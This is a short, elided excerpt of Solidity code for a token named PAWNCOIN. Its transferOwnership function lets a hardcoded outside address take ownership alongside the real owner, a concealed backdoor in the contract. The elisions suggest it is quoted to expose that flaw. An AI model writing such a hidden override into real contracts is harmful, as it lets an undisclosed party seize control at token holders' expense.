...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0x099b1C4df914A88282c8ce4997384313613dEFc7));
...
contract PawnCoin is Context, IERC20, Ownable, Pausable {
  ...
  uint256 private _totalSupply = 12000000000 * 10**9;
  string private _symbol = "PAWN";
  string private _name = "PAWNCOIN";
